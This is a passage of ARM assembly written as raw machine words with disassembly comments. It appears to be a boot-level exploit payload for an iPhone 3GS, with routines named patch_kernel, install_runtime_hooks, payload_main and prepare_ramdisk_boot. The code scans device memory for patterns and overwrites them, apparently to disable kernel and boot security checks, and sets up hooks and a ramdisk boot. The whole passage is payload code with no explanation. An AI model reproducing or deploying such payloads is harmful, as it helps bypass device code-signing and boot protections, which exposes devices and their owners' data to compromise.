    .word  0xE5832000    /* 1474: str      r2, [r3] */
    .word  0xEA000009    /* 1478: b        #0x1014a4 */
    .word  0xE3510001    /* 147C: cmp      r1, #1 */
    .word  0x1A000002    /* 1480: bne      #0x101490 */
    .word  0xE1A00004    /* 1484: mov      r0, r4 */
    .word  0xEBFFFEE7    /* 1488: bl       #0x10102c */
    .word  0xEA000004    /* 148C: b        #0x1014a4 */
    .word  0xE3510002    /* 1490: cmp      r1, #2 */
    .word  0x1A000002    /* 1494: bne      #0x1014a4 */
    .word  0xE1A00004    /* 1498: mov      r0, r4 */
    .word  0xE3A01001    /* 149C: mov      r1, #1 */
    .word  0xEBFFFF2E    /* 14A0: bl       #0x101160 */
    .word  0xE59F302C    /* 14A4: ldr      r3, [pc, #0x2c] */
    .word  0xE1A0E00F    /* 14A8: mov      lr, pc */
    .word  0xE593F000    /* 14AC: ldr      pc, [r3] */
    .word  0xE8BD8030    /* 14B0: pop      {r4, r5, pc} */
    .word  0x0010256C    /* 14B4: andseq   r2, r0, ip, ror #10 */
    .word  0x00102578    /* 14B8: andseq   r2, r0, r8, ror r5 */
    .word  0x00102544    /* 14BC: andseq   r2, r0, r4, asr #10 */
    .word  0x00101D78    /* 14C0: andseq   r1, r0, r8, ror sp */
    .word  0x00102398    /* 14C4: mulseq   r0, r8, r3 */
    .word  0x00102548    /* 14C8: andseq   r2, r0, r8, asr #10 */
    .word  0x69626F74    /* 14CC: stmdbvs  r2!, {r2, r4, r5, r6, r8, sb, sl, fp, sp, lr} ^ */
    .word  0x00102538    /* 14D0: andseq   r2, r0, r8, lsr r5 */
    .word  0x00102534    /* 14D4: andseq   r2, r0, r4, lsr r5 */
    .word  0x00102554    /* 14D8: andseq   r2, r0, r4, asr r5 */
    .word  0xE59F3088    /* 14DC: ldr      r3, [pc, #0x88] */
    .word  0xE5933000    /* 14E0: ldr      r3, [r3] */

/* ----- handle_3gs_image @ 0x14E4 ----- */
handle_3gs_image:
    .word  0xE92D4DF0    /* 14E4: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE59F0080    /* 14E8: ldr      r0, [pc, #0x80] */
    .word  0xE3A01C01    /* 14EC: mov      r1, #0x100 */
    .word  0xE5936008    /* 14F0: ldr      r6, [r3, #8] */
    .word  0xEBFFFD1E    /* 14F4: bl       #0x100974 */
    .word  0xE3A07000    /* 14F8: mov      r7, #0 */
    .word  0xE59FB070    /* 14FC: ldr      fp, [pc, #0x70] */
    .word  0xE1A0A007    /* 1500: mov      sl, r7 */
    .word  0xE2868B03    /* 1504: add      r8, r6, #0xc00 */
    .word  0xE1A00006    /* 1508: mov      r0, r6 */
    .word  0xE3A010CC    /* 150C: mov      r1, #0xcc */
    .word  0xE3A02601    /* 1510: mov      r2, #0x100000 */
    .word  0xEBFFFCEA    /* 1514: bl       #0x1008c4 */
    .word  0xE1A05006    /* 1518: mov      r5, r6 */
    .word  0xE1A0400A    /* 151C: mov      r4, sl */
    .word  0xE1A01004    /* 1520: mov      r1, r4 */
    .word  0xE1A02005    /* 1524: mov      r2, r5 */
    .word  0xE2844001    /* 1528: add      r4, r4, #1 */
    .word  0xE1A00007    /* 152C: mov      r0, r7 */
    .word  0xE1A0E00F    /* 1530: mov      lr, pc */
    .word  0xE59BF000    /* 1534: ldr      pc, [fp] */
    .word  0xE3540037    /* 1538: cmp      r4, #0x37 */
    .word  0xE2855C06    /* 153C: add      r5, r5, #0x600 */
    .word  0x1AFFFFF6    /* 1540: bne      #0x101520 */
    .word  0xE3A01040    /* 1544: mov      r1, #0x40 */
    .word  0xE1A00006    /* 1548: mov      r0, r6 */
    .word  0xEBFFFD08    /* 154C: bl       #0x100974 */
    .word  0xE2877001    /* 1550: add      r7, r7, #1 */
    .word  0xE1A00008    /* 1554: mov      r0, r8 */
    .word  0xE3A01040    /* 1558: mov      r1, #0x40 */
    .word  0xEBFFFD04    /* 155C: bl       #0x100974 */
    .word  0xE3570010    /* 1560: cmp      r7, #0x10 */
    .word  0x1AFFFFE7    /* 1564: bne      #0x101508 */
    .word  0xE8BD8DF0    /* 1568: pop      {r4, r5, r6, r7, r8, sl, fp, pc} */
    .word  0x0010256C    /* 156C: andseq   r2, r0, ip, ror #10 */
    .word  0x4FF29C10    /* 1570: svcmi    #0xf29c10 */
    .word  0x00102498    /* 1574: mulseq   r0, r8, r4 */

/* ----- patch_kernel @ 0x1578 ----- */
patch_kernel:
    .word  0xE92D4DF0    /* 1578: push     {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xE20154FF    /* 157C: and      r5, r1, #0xff000000 */
    .word  0xE1A01005    /* 1580: mov      r1, r5 */
    .word  0xE3A0200D    /* 1584: mov      r2, #0xd */
    .word  0xE24DD008    /* 1588: sub      sp, sp, #8 */
    .word  0xE59F036C    /* 158C: ldr      r0, [pc, #0x36c] */
    .word  0xEBFFFC4A    /* 1590: bl       #0x1006c0 */
    .word  0xE3C004FF    /* 1594: bic      r0, r0, #0xff000000 */
    .word  0xE380B103    /* 1598: orr      fp, r0, #0xc0000000 */
    .word  0xE1A02005    /* 159C: mov      r2, r5 */
    .word  0xE2851401    /* 15A0: add      r1, r5, #0x1000000 */
    .word  0xEA000003    /* 15A4: b        #0x1015b8 */
    .word  0xE5923000    /* 15A8: ldr      r3, [r2] */
    .word  0xE153000B    /* 15AC: cmp      r3, fp */
    .word  0x0A000002    /* 15B0: beq      #0x1015c0 */
    .word  0xE2822004    /* 15B4: add      r2, r2, #4 */
    .word  0xE1520001    /* 15B8: cmp      r2, r1 */
    .word  0x3AFFFFF9    /* 15BC: blo      #0x1015a8 */
    .word  0xE3A03000    /* 15C0: mov      r3, #0 */
    .word  0xE502301C    /* 15C4: str      r3, [r2, #-0x1c] */
    .word  0xE59F3334    /* 15C8: ldr      r3, [pc, #0x334] */
    .word  0xE5933000    /* 15CC: ldr      r3, [r3] */
    .word  0xE3530000    /* 15D0: cmp      r3, #0 */
    .word  0x1A000005    /* 15D4: bne      #0x1015f0 */
    .word  0xE59F0328    /* 15D8: ldr      r0, [pc, #0x328] */
    .word  0xE1A01005    /* 15DC: mov      r1, r5 */
    .word  0xE3A0200A    /* 15E0: mov      r2, #0xa */
    .word  0xEBFFFC35    /* 15E4: bl       #0x1006c0 */
    .word  0xE2800004    /* 15E8: add      r0, r0, #4 */
    .word  0xEA000004    /* 15EC: b        #0x101604 */
    .word  0xE59F0314    /* 15F0: ldr      r0, [pc, #0x314] */
    .word  0xE1A01005    /* 15F4: mov      r1, r5 */
    .word  0xE3A02014    /* 15F8: mov      r2, #0x14 */
    .word  0xEBFFFC2F    /* 15FC: bl       #0x1006c0 */
    .word  0xE280000C    /* 1600: add      r0, r0, #0xc */
    .word  0xE3A03001    /* 1604: mov      r3, #1 */
    .word  0xE5C03000    /* 1608: strb     r3, [r0] */
    .word  0xE59F42FC    /* 160C: ldr      r4, [pc, #0x2fc] */
    .word  0xE5943000    /* 1610: ldr      r3, [r4] */
    .word  0xE5930008    /* 1614: ldr      r0, [r3, #8] */
    .word  0xEBFFFCD6    /* 1618: bl       #0x100978 */
    .word  0xE2501000    /* 161C: subs     r1, r0, #0 */
    .word  0x1A0000A5    /* 1620: bne      #0x1018bc */
    .word  0xE5943000    /* 1624: ldr      r3, [r4] */
    .word  0xE5930008    /* 1628: ldr      r0, [r3, #8] */
    .word  0xE3A02502    /* 162C: mov      r2, #0x800000 */
    .word  0xE2800501    /* 1630: add      r0, r0, #0x400000 */
    .word  0xEBFFFCA2    /* 1634: bl       #0x1008c4 */
    .word  0xE5943000    /* 1638: ldr      r3, [r4] */
    .word  0xE5931008    /* 163C: ldr      r1, [r3, #8] */
    .word  0xE5913038    /* 1640: ldr      r3, [r1, #0x38] */
    .word  0xE5912004    /* 1644: ldr      r2, [r1, #4] */
    .word  0xE2837034    /* 1648: add      r7, r3, #0x34 */
    .word  0xE281350A    /* 164C: add      r3, r1, #0x2800000 */
    .word  0xE0672002    /* 1650: rsb      r2, r7, r2 */
    .word  0xE0871001    /* 1654: add      r1, r7, r1 */
    .word  0xE1A00003    /* 1658: mov      r0, r3 */
    .word  0xE58D2004    /* 165C: str      r2, [sp, #4] */
    .word  0xE58D3000    /* 1660: str      r3, [sp] */
    .word  0xEBFFFC9E    /* 1664: bl       #0x1008e4 */
    .word  0xE59F3294    /* 1668: ldr      r3, [pc, #0x294] */
    .word  0xE5933000    /* 166C: ldr      r3, [r3] */
    .word  0xE3530000    /* 1670: cmp      r3, #0 */
    .word  0x05943000    /* 1674: ldreq    r3, [r4] */
    .word  0x15943000    /* 1678: ldrne    r3, [r4] */
    .word  0x05931000    /* 167C: ldreq    r1, [r3] */
    .word  0x15931000    /* 1680: ldrne    r1, [r3] */
    .word  0x03A02008    /* 1684: moveq    r2, #8 */
    .word  0x13A02010    /* 1688: movne    r2, #0x10 */
    .word  0x059F0280    /* 168C: ldreq    r0, [pc, #0x280] */
    .word  0x159F0280    /* 1690: ldrne    r0, [pc, #0x280] */
    .word  0xEBFFFC09    /* 1694: bl       #0x1006c0 */
    .word  0xE59F4270    /* 1698: ldr      r4, [pc, #0x270] */
    .word  0xE5943000    /* 169C: ldr      r3, [r4] */
    .word  0xE59F6274    /* 16A0: ldr      r6, [pc, #0x274] */
    .word  0xE5933008    /* 16A4: ldr      r3, [r3, #8] */
    .word  0xE2800001    /* 16A8: add      r0, r0, #1 */
    .word  0xE5860000    /* 16AC: str      r0, [r6] */
    .word  0xE5930050    /* 16B0: ldr      r0, [r3, #0x50] */
    .word  0xEBFFFAA5    /* 16B4: bl       #0x100150 */
    .word  0xE5943000    /* 16B8: ldr      r3, [r4] */
    .word  0xE1A0A000    /* 16BC: mov      sl, r0 */
    .word  0xE5930008    /* 16C0: ldr      r0, [r3, #8] */
    .word  0xE1A0200A    /* 16C4: mov      r2, sl */
    .word  0xE2801D07    /* 16C8: add      r1, r0, #0x1c0 */
    .word  0xE2800501    /* 16CC: add      r0, r0, #0x400000 */
    .word  0xEBFFFB0D    /* 16D0: bl       #0x10030c */
    .word  0xE5943000    /* 16D4: ldr      r3, [r4] */
    .word  0xE5933008    /* 16D8: ldr      r3, [r3, #8] */
    .word  0xE1A08000    /* 16DC: mov      r8, r0 */
    .word  0xE593004C    /* 16E0: ldr      r0, [r3, #0x4c] */
    .word  0xEBFFFA99    /* 16E4: bl       #0x100150 */
    .word  0xE59F3214    /* 16E8: ldr      r3, [pc, #0x214] */
    .word  0xE5933000    /* 16EC: ldr      r3, [r3] */
    .word  0xE3530000    /* 16F0: cmp      r3, #0 */
    .word  0x1A000007    /* 16F4: bne      #0x101718 */
    .word  0xE5943000    /* 16F8: ldr      r3, [r4] */
    .word  0xE5931008    /* 16FC: ldr      r1, [r3, #8] */
    .word  0xE59F0200    /* 1700: ldr      r0, [pc, #0x200] */
    .word  0xE2811501    /* 1704: add      r1, r1, #0x400000 */
    .word  0xE3A0200A    /* 1708: mov      r2, #0xa */
    .word  0xEBFFFBEB    /* 170C: bl       #0x1006c0 */
    .word  0xE2800004    /* 1710: add      r0, r0, #4 */
    .word  0xEA000006    /* 1714: b        #0x101734 */
    .word  0xE5943000    /* 1718: ldr      r3, [r4] */
    .word  0xE5931008    /* 171C: ldr      r1, [r3, #8] */
    .word  0xE59F01E4    /* 1720: ldr      r0, [pc, #0x1e4] */
    .word  0xE2811501    /* 1724: add      r1, r1, #0x400000 */
    .word  0xE3A02014    /* 1728: mov      r2, #0x14 */
    .word  0xEBFFFBE3    /* 172C: bl       #0x1006c0 */
    .word  0xE280000C    /* 1730: add      r0, r0, #0xc */
    .word  0xE3A03001    /* 1734: mov      r3, #1 */
    .word  0xE5C03000    /* 1738: strb     r3, [r0] */
    .word  0xE59F31CC    /* 173C: ldr      r3, [pc, #0x1cc] */
    .word  0xE5933000    /* 1740: ldr      r3, [r3] */
    .word  0xE5932008    /* 1744: ldr      r2, [r3, #8] */
    .word  0xE2831008    /* 1748: add      r1, r3, #8 */
    .word  0xE2820505    /* 174C: add      r0, r2, #0x1400000 */
    .word  0xE2822501    /* 1750: add      r2, r2, #0x400000 */
    .word  0xEA000003    /* 1754: b        #0x101768 */
    .word  0xE5923000    /* 1758: ldr      r3, [r2] */
    .word  0xE153000B    /* 175C: cmp      r3, fp */
    .word  0x0A000002    /* 1760: beq      #0x101770 */
    .word  0xE2822004    /* 1764: add      r2, r2, #4 */
    .word  0xE1520000    /* 1768: cmp      r2, r0 */
    .word  0x3AFFFFF9    /* 176C: blo      #0x101758 */
    .word  0xE3A03000    /* 1770: mov      r3, #0 */
    .word  0xE502301C    /* 1774: str      r3, [r2, #-0x1c] */
    .word  0xE59F3184    /* 1778: ldr      r3, [pc, #0x184] */
    .word  0xE5933000    /* 177C: ldr      r3, [r3] */
    .word  0xE3530000    /* 1780: cmp      r3, #0 */
    .word  0xE5911000    /* 1784: ldr      r1, [r1] */
    .word  0x1A000005    /* 1788: bne      #0x1017a4 */
    .word  0xE2811501    /* 178C: add      r1, r1, #0x400000 */
    .word  0xE59F0188    /* 1790: ldr      r0, [pc, #0x188] */
    .word  0xE3A0200C    /* 1794: mov      r2, #0xc */
    .word  0xEBFFFBC8    /* 1798: bl       #0x1006c0 */
    .word  0xE2800012    /* 179C: add      r0, r0, #0x12 */
    .word  0xEA000004    /* 17A0: b        #0x1017b8 */
    .word  0xE2811501    /* 17A4: add      r1, r1, #0x400000 */
    .word  0xE59F0174    /* 17A8: ldr      r0, [pc, #0x174] */
    .word  0xE3A0200C    /* 17AC: mov      r2, #0xc */
    .word  0xEBFFFBC2    /* 17B0: bl       #0x1006c0 */
    .word  0xE2800010    /* 17B4: add      r0, r0, #0x10 */
    .word  0xE59F6150    /* 17B8: ldr      r6, [pc, #0x150] */
    .word  0xE59F3164    /* 17BC: ldr      r3, [pc, #0x164] */
    .word  0xE5803000    /* 17C0: str      r3, [r0] */
    .word  0xE5963000    /* 17C4: ldr      r3, [r6] */
    .word  0xE5930008    /* 17C8: ldr      r0, [r3, #8] */
    .word  0xE1A01008    /* 17CC: mov      r1, r8 */
    .word  0xE59F3144    /* 17D0: ldr      r3, [pc, #0x144] */
    .word  0xE2800501    /* 17D4: add      r0, r0, #0x400000 */
    .word  0xE1A0E00F    /* 17D8: mov      lr, pc */
    .word  0xE593F000    /* 17DC: ldr      pc, [r3] */
    .word  0xE5963000    /* 17E0: ldr      r3, [r6] */
    .word  0xE5934008    /* 17E4: ldr      r4, [r3, #8] */
    .word  0xEBFFFA58    /* 17E8: bl       #0x100150 */
    .word  0xE5963000    /* 17EC: ldr      r3, [r6] */
    .word  0xE5840048    /* 17F0: str      r0, [r4, #0x48] */
    .word  0xE5930008    /* 17F4: ldr      r0, [r3, #8] */
    .word  0xE59F112C    /* 17F8: ldr      r1, [pc, #0x12c] */
    .word  0xE2802501    /* 17FC: add      r2, r0, #0x400000 */
    .word  0xE1A03008    /* 1800: mov      r3, r8 */
    .word  0xE2800D07    /* 1804: add      r0, r0, #0x1c0 */
    .word  0xEBFFFCDA    /* 1808: bl       #0x100b78 */
    .word  0xE596E000    /* 180C: ldr      lr, [r6] */
    .word  0xE59EC008    /* 1810: ldr      ip, [lr, #8] */
    .word  0xE2400D07    /* 1814: sub      r0, r0, #0x1c0 */
    .word  0xE06C4000    /* 1818: rsb      r4, ip, r0 */
    .word  0xE24A2001    /* 181C: sub      r2, sl, #1 */
    .word  0xE2443001    /* 1820: sub      r3, r4, #1 */
    .word  0xE3C3300F    /* 1824: bic      r3, r3, #0xf */
    .word  0xE3C2200F    /* 1828: bic      r2, r2, #0xf */
    .word  0xE0621003    /* 182C: rsb      r1, r2, r3 */
    .word  0xE3510000    /* 1830: cmp      r1, #0 */
    .word  0xDA000017    /* 1834: ble      #0x101898 */
    .word  0xE59C3004    /* 1838: ldr      r3, [ip, #4] */
    .word  0xE0833001    /* 183C: add      r3, r3, r1 */
    .word  0xE58C3004    /* 1840: str      r3, [ip, #4] */
    .word  0xE59E2008    /* 1844: ldr      r2, [lr, #8] */
    .word  0xE5923008    /* 1848: ldr      r3, [r2, #8] */
    .word  0xE0833001    /* 184C: add      r3, r3, r1 */
    .word  0xE5823008    /* 1850: str      r3, [r2, #8] */
    .word  0xE59E2008    /* 1854: ldr      r2, [lr, #8] */
    .word  0xE592300C    /* 1858: ldr      r3, [r2, #0xc] */
    .word  0xE0833001    /* 185C: add      r3, r3, r1 */
    .word  0xE582300C    /* 1860: str      r3, [r2, #0xc] */
    .word  0xE59E2008    /* 1864: ldr      r2, [lr, #8] */
    .word  0xE5923038    /* 1868: ldr      r3, [r2, #0x38] */
    .word  0xE0833001    /* 186C: add      r3, r3, r1 */
    .word  0xE5823038    /* 1870: str      r3, [r2, #0x38] */
    .word  0xE59E2008    /* 1874: ldr      r2, [lr, #8] */
    .word  0xE592303C    /* 1878: ldr      r3, [r2, #0x3c] */
    .word  0xE0833001    /* 187C: add      r3, r3, r1 */
    .word  0xE582303C    /* 1880: str      r3, [r2, #0x3c] */
    .word  0xE59E0008    /* 1884: ldr      r0, [lr, #8] */
    .word  0xE0870000    /* 1888: add      r0, r7, r0 */
    .word  0xE0800001    /* 188C: add      r0, r0, r1 */
    .word  0xE89D0006    /* 1890: ldm      sp, {r1, r2} */
    .word  0xEBFFFC12    /* 1894: bl       #0x1008e4 */
    .word  0xE5961000    /* 1898: ldr      r1, [r6] */
    .word  0xE5912008    /* 189C: ldr      r2, [r1, #8] */
    .word  0xE2843D06    /* 18A0: add      r3, r4, #0x180 */
    .word  0xE582303C    /* 18A4: str      r3, [r2, #0x3c] */
    .word  0xE1A00004    /* 18A8: mov      r0, r4 */
    .word  0xE5914008    /* 18AC: ldr      r4, [r1, #8] */
    .word  0xEBFFFA26    /* 18B0: bl       #0x100150 */
    .word  0xE5840050    /* 18B4: str      r0, [r4, #0x50] */
    .word  0xEA000005    /* 18B8: b        #0x1018d4 */
    .word  0xE59F006C    /* 18BC: ldr      r0, [pc, #0x6c] */
    .word  0xE1A01005    /* 18C0: mov      r1, r5 */
    .word  0xE3A02007    /* 18C4: mov      r2, #7 */
    .word  0xEBFFFB7C    /* 18C8: bl       #0x1006c0 */
    .word  0xE3A03000    /* 18CC: mov      r3, #0 */
    .word  0xE5C03000    /* 18D0: strb     r3, [r0] */
    .word  0xE1A01005    /* 18D4: mov      r1, r5 */
    .word  0xE3A02016    /* 18D8: mov      r2, #0x16 */
    .word  0xE59F0050    /* 18DC: ldr      r0, [pc, #0x50] */
    .word  0xEBFFFB76    /* 18E0: bl       #0x1006c0 */
    .word  0xE59F3024    /* 18E4: ldr      r3, [pc, #0x24] */
    .word  0xE5933000    /* 18E8: ldr      r3, [r3] */
    .word  0xE5931008    /* 18EC: ldr      r1, [r3, #8] */
    .word  0xE3A02501    /* 18F0: mov      r2, #0x400000 */
    .word  0xE28DD008    /* 18F4: add      sp, sp, #8 */
    .word  0xE8BD4DF0    /* 18F8: pop      {r4, r5, r6, r7, r8, sl, fp, lr} */
    .word  0xEAFFFBF8    /* 18FC: b        #0x1008e4 */
    .word  0x001023E4    /* 1900: andseq   r2, r0, r4, ror #7 */
    .word  0x00102538    /* 1904: andseq   r2, r0, r8, lsr r5 */
    .word  0x00102402    /* 1908: andseq   r2, r0, r2, lsl #8 */
    .word  0x0010240C    /* 190C: andseq   r2, r0, ip, lsl #8 */
    .word  0x0010256C    /* 1910: andseq   r2, r0, ip, ror #10 */
    .word  0x001024E8    /* 1914: andseq   r2, r0, r8, ror #9 */
    .word  0x001024F0    /* 1918: ldrsheq  r2, [r0], -r0 */
    .word  0x00102550    /* 191C: andseq   r2, r0, r0, asr r5 */
    .word  0x00102504    /* 1920: andseq   r2, r0, r4, lsl #10 */
    .word  0x00102510    /* 1924: andseq   r2, r0, r0, lsl r5 */
    .word  0x46C046C0    /* 1928: strbmi   r4, [r0], r0, asr #13 */
    .word  0x003FFE40    /* 192C: eorseq   pc, pc, r0, asr #28 */
    .word  0x00101D50    /* 1930: andseq   r1, r0, r0, asr sp */
    .word  0x00101D78    /* 1934: andseq   r1, r0, r8, ror sp */

/* ----- install_runtime_hooks @ 0x1938 ----- */
install_runtime_hooks:
    .word  0xE59F3054    /* 1938: ldr      r3, [pc, #0x54] */
    .word  0xE5933000    /* 193C: ldr      r3, [r3] */
    .word  0xE3530000    /* 1940: cmp      r3, #0 */
    .word  0x059F204C    /* 1944: ldreq    r2, [pc, #0x4c] */
    .word  0xE92D4030    /* 1948: push     {r4, r5, lr} */
    .word  0x05925000    /* 194C: ldreq    r5, [r2] */
    .word  0x02053003    /* 1950: andeq    r3, r5, #3 */
    .word  0x03833001    /* 1954: orreq    r3, r3, #1 */
    .word  0xE59F4034    /* 1958: ldr      r4, [pc, #0x34] */
    .word  0x05823000    /* 195C: streq    r3, [r2] */
    .word  0x059F0034    /* 1960: ldreq    r0, [pc, #0x34] */
    .word  0x159F0034    /* 1964: ldrne    r0, [pc, #0x34] */
    .word  0xEBFFFA58    /* 1968: bl       #0x1002d0 */
    .word  0xE5943000    /* 196C: ldr      r3, [r4] */
    .word  0xE3530001    /* 1970: cmp      r3, #1 */
    .word  0x159F0028    /* 1974: ldrne    r0, [pc, #0x28] */
    .word  0x159F1028    /* 1978: ldrne    r1, [pc, #0x28] */
    .word  0x1BFFFBE4    /* 197C: blne     #0x100914 */
    .word  0xE5943000    /* 1980: ldr      r3, [r4] */
    .word  0xE3530000    /* 1984: cmp      r3, #0 */
    .word  0x059F3008    /* 1988: ldreq    r3, [pc, #8] */
    .word  0x05835000    /* 198C: streq    r5, [r3] */
    .word  0xE8BD8030    /* 1990: pop      {r4, r5, pc} */
    .word  0x00102538    /* 1994: andseq   r2, r0, r8, lsr r5 */
    .word  0xBF100000    /* 1998: svclt    #0x100000 */
    .word  0x00000C1E    /* 199C: andeq    r0, r0, lr, lsl ip */
    .word  0x20000C1E    /* 19A0: andhs    r0, r0, lr, lsl ip */
    .word  0x00102558    /* 19A4: andseq   r2, r0, r8, asr r5 */
    .word  0x00200280    /* 19A8: eoreq    r0, r0, r0, lsl #5 */

/* ----- payload_main @ 0x19AC ----- */
payload_main:
    .word  0xE3A03601    /* 19AC: mov      r3, #0x100000 */
    .word  0xE5931000    /* 19B0: ldr      r1, [r3] */
    .word  0xE59F308C    /* 19B4: ldr      r3, [pc, #0x8c] */
    .word  0xE3A02014    /* 19B8: mov      r2, #0x14 */
    .word  0xE02C3291    /* 19BC: mla      ip, r1, r2, r3 */
    .word  0xE59F3084    /* 19C0: ldr      r3, [pc, #0x84] */
    .word  0xE5831000    /* 19C4: str      r1, [r3] */
    .word  0xE59C100C    /* 19C8: ldr      r1, [ip, #0xc] */
    .word  0xE59C0010    /* 19CC: ldr      r0, [ip, #0x10] */
    .word  0xE5912010    /* 19D0: ldr      r2, [r1, #0x10] */
    .word  0xE59F3074    /* 19D4: ldr      r3, [pc, #0x74] */
    .word  0xE92D4010    /* 19D8: push     {r4, lr} */
    .word  0xE5832000    /* 19DC: str      r2, [r3] */
    .word  0xE59F406C    /* 19E0: ldr      r4, [pc, #0x6c] */
    .word  0xE5810014    /* 19E4: str      r0, [r1, #0x14] */
    .word  0xE584C000    /* 19E8: str      ip, [r4] */
    .word  0xE59C1004    /* 19EC: ldr      r1, [ip, #4] */
    .word  0xE3A02008    /* 19F0: mov      r2, #8 */
    .word  0xE59F005C    /* 19F4: ldr      r0, [pc, #0x5c] */
    .word  0xEBFFFB30    /* 19F8: bl       #0x1006c0 */
    .word  0xE5943000    /* 19FC: ldr      r3, [r4] */
    .word  0xE59F4054    /* 1A00: ldr      r4, [pc, #0x54] */
    .word  0xE280C001    /* 1A04: add      ip, r0, #1 */
    .word  0xE5931004    /* 1A08: ldr      r1, [r3, #4] */
    .word  0xE3A02008    /* 1A0C: mov      r2, #8 */
    .word  0xE584C000    /* 1A10: str      ip, [r4] */
    .word  0xE59F0044    /* 1A14: ldr      r0, [pc, #0x44] */
    .word  0xEBFFFB28    /* 1A18: bl       #0x1006c0 */
    .word  0xE59F3040    /* 1A1C: ldr      r3, [pc, #0x40] */
    .word  0xE2800001    /* 1A20: add      r0, r0, #1 */
    .word  0xE5830000    /* 1A24: str      r0, [r3] */
    .word  0xE3A01002    /* 1A28: mov      r1, #2 */
    .word  0xE59F0034    /* 1A2C: ldr      r0, [pc, #0x34] */
    .word  0xE1A0E00F    /* 1A30: mov      lr, pc */
    .word  0xE594F000    /* 1A34: ldr      pc, [r4] */
    .word  0xE59F302C    /* 1A38: ldr      r3, [pc, #0x2c] */
    .word  0xE5830000    /* 1A3C: str      r0, [r3] */
    .word  0xE8BD4010    /* 1A40: pop      {r4, lr} */
    .word  0xEAFFFFBB    /* 1A44: b        #0x101938 */
    .word  0x00102420    /* 1A48: andseq   r2, r0, r0, lsr #8 */
    .word  0x00102538    /* 1A4C: andseq   r2, r0, r8, lsr r5 */
    .word  0x00102568    /* 1A50: andseq   r2, r0, r8, ror #10 */
    .word  0x0010256C    /* 1A54: andseq   r2, r0, ip, ror #10 */
    .word  0x00102398    /* 1A58: mulseq   r0, r8, r3 */
    .word  0x00102574    /* 1A5C: andseq   r2, r0, r4, ror r5 */
    .word  0x001023A0    /* 1A60: andseq   r2, r0, r0, lsr #7 */
    .word  0x00102580    /* 1A64: andseq   r2, r0, r0, lsl #11 */
    .word  0x69626F74    /* 1A68: stmdbvs  r2!, {r2, r4, r5, r6, r8, sb, sl, fp, sp, lr} ^ */
    .word  0x0010257C    /* 1A6C: andseq   r2, r0, ip, ror r5 */

/* ----- prepare_ramdisk_boot @ 0x1A70 ----- */
prepare_ramdisk_boot:
    .word  0xE92D4010    /* 1A70: push     {r4, lr} */
    .word  0xE59F4118    /* 1A74: ldr      r4, [pc, #0x118] */
    .word  0xE5943000    /* 1A78: ldr      r3, [r4] */
    .word  0xE5933004    /* 1A7C: ldr      r3, [r3, #4] */
    .word  0xE5932208    /* 1A80: ldr      r2, [r3, #0x208] */
    .word  0xE59F310C    /* 1A84: ldr      r3, [pc, #0x10c] */
    .word  0xE1520003    /* 1A88: cmp      r2, r3 */
    .word  0xE24DD008    /* 1A8C: sub      sp, sp, #8 */
    .word  0x0BFFFB21    /* 1A90: bleq     #0x10071c */
    .word  0xE5943000    /* 1A94: ldr      r3, [r4] */
    .word  0xE5933008    /* 1A98: ldr      r3, [r3, #8] */
    .word  0xE2833802    /* 1A9C: add      r3, r3, #0x20000 */
    .word  0xE58D3004    /* 1AA0: str      r3, [sp, #4] */
    .word  0xE3A03601    /* 1AA4: mov      r3, #0x100000 */
    .word  0xE58D3000    /* 1AA8: str      r3, [sp] */
    .word  0xE59F30E8    /* 1AAC: ldr      r3, [pc, #0xe8] */
    .word  0xE59FC0E8    /* 1AB0: ldr      ip, [pc, #0xe8] */
    .word  0xE5930000    /* 1AB4: ldr      r0, [r3] */
    .word  0xE59F10E4    /* 1AB8: ldr      r1, [pc, #0xe4] */
    .word  0xE1A0300D    /* 1ABC: mov      r3, sp */
    .word  0xE28D2004    /* 1AC0: add      r2, sp, #4 */
    .word  0xE1A0E00F    /* 1AC4: mov      lr, pc */
    .word  0xE59CF000    /* 1AC8: ldr      pc, [ip] */
    .word  0xE59D1004    /* 1ACC: ldr      r1, [sp, #4] */
    .word  0xE3A02A02    /* 1AD0: mov      r2, #0x2000 */
    .word  0xE3A00000    /* 1AD4: mov      r0, #0 */
    .word  0xEBFFFB81    /* 1AD8: bl       #0x1008e4 */
    .word  0xEBFFF99D    /* 1ADC: bl       #0x100158 */
    .word  0xE3A00000    /* 1AE0: mov      r0, #0 */
    .word  0xE3A01040    /* 1AE4: mov      r1, #0x40 */
    .word  0xEBFFFBA1    /* 1AE8: bl       #0x100974 */
    .word  0xE594E000    /* 1AEC: ldr      lr, [r4] */
    .word  0xE3A01000    /* 1AF0: mov      r1, #0 */
    .word  0xE59F40AC    /* 1AF4: ldr      r4, [pc, #0xac] */
    .word  0xE1A00001    /* 1AF8: mov      r0, r1 */
    .word  0xEA000006    /* 1AFC: b        #0x101b1c */
    .word  0xE5913000    /* 1B00: ldr      r3, [r1] */
    .word  0xE59E2000    /* 1B04: ldr      r2, [lr] */
    .word  0xE1A03A23    /* 1B08: lsr      r3, r3, #0x14 */
    .word  0xE1A03A03    /* 1B0C: lsl      r3, r3, #0x14 */
    .word  0xE1530002    /* 1B10: cmp      r3, r2 */
    .word  0x1A000003    /* 1B14: bne      #0x101b28 */
    .word  0xE2811004    /* 1B18: add      r1, r1, #4 */
    .word  0xE280C018    /* 1B1C: add      ip, r0, #0x18 */
    .word  0xE151000C    /* 1B20: cmp      r1, ip */
    .word  0x3AFFFFF5    /* 1B24: blo      #0x101b00 */
    .word  0xE151000C    /* 1B28: cmp      r1, ip */
    .word  0x1A00000E    /* 1B2C: bne      #0x101b6c */
    .word  0xE2402004    /* 1B30: sub      r2, r0, #4 */
    .word  0xE240C080    /* 1B34: sub      ip, r0, #0x80 */
    .word  0xEA000003    /* 1B38: b        #0x101b4c */
    .word  0xE5923000    /* 1B3C: ldr      r3, [r2] */
    .word  0xE3530000    /* 1B40: cmp      r3, #0 */
    .word  0x1A000003    /* 1B44: bne      #0x101b58 */
    .word  0xE2422004    /* 1B48: sub      r2, r2, #4 */
    .word  0xE152000C    /* 1B4C: cmp      r2, ip */
    .word  0xE1A0100C    /* 1B50: mov      r1, ip */
    .word  0x8AFFFFF8    /* 1B54: bhi      #0x101b3c */
    .word  0xE1520001    /* 1B58: cmp      r2, r1 */
    .word  0x059F3048    /* 1B5C: ldreq    r3, [pc, #0x48] */
    .word  0x05933000    /* 1B60: ldreq    r3, [r3] */
    .word  0x05803008    /* 1B64: streq    r3, [r0, #8] */
    .word  0x0A000003    /* 1B68: beq      #0x101b7c */
